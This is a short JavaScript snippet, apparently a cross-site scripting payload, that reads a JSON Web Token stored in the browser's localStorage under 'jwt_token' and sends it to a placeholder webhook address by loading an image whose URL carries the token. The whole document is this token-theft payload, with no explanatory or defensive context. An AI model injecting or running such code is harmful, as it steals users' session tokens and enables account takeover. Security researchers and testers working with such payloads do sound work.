var jwt = window.localStorage.getItem("jwt_token");

if (jwt) {
  new Image().src = "<URL_WEBHOOK>?token=" + encodeURIComponent(jwt);
}
